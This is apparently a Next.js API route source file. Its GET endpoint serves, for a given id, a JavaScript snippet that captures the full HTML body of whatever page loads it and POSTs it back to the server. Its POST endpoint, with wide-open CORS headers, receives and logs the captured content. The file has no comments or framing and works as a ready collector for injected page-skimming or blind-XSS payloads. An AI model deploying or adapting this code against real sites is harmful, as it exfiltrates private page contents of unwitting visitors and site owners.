import { NextResponse } from "next/server";

export async function GET(req: Request) {
  const { searchParams } = new URL(req.url);
  const id = searchParams.get("id") || null;

  const domain = req.url.split("api")[0];

  if (id) {
    console.log("id has been added:", id);
    const scriptContent = `
      const body = document.body.innerHTML;
      console.log(body);
      async function sendData(data) {
        const res = await fetch("${domain}/api/js?id=${id}",{
          method: "POST", 
          headers: {
            "Content-Type": "text/plain", 
            "Access-Control-Allow-Origin": '*',
            'Access-Control-Allow-Methods': 'POST, GET, OPTIONS',
            'Access-Control-Allow-Headers': 'Content-Type',
          }, 
          body: data })

        console.log(res.status);
      }
      sendData(body);
    `;

    return new NextResponse(scriptContent, {
      headers: {
        "Content-Type": "application/javascript",
        "Cache-Control": "no-store, max-age=0",
        "Access-Control-Allow-Origin": "*",
        "Access-Control-Allow-Methods": "POST, GET, OPTIONS",
        "Access-Control-Allow-Headers": "Content-Type",
      },
    });
  } else {
    console.log("no id has been added");
    return new NextResponse(`<h1>null</h1>`);
  }
}

export async function POST(req: Request) {
  try {
    const body = await req.text();
    console.log("raw body received:", body);
    //const chunks = [];
    //
    //// Read the stream in chunks
    //for await (const chunk of req.body) {
    //  chunks.push(chunk);
    //}
    //
    //// Combine chunks into a single buffer
    //const data = Buffer.concat(chunks);
    //
    //// Process the data as needed
    //const parsedData = JSON.parse(data);
    //
    //console.log(parsedData);
    // Respond with the processed data
    return new Response(
      JSON.stringify({ message: "Data received successfully" }),
      {
        status: 200,
        headers: {
          "Access-Control-Allow-Origin": "*",
          "Content-Type": "application/json",
        },
      },
    );
  } catch (error) {
    console.error("Error processing request body:", error);
    return new Response(
      JSON.stringify({ message: "Error processing request" }),
      {
        status: 500,
      },
    );
  }
}
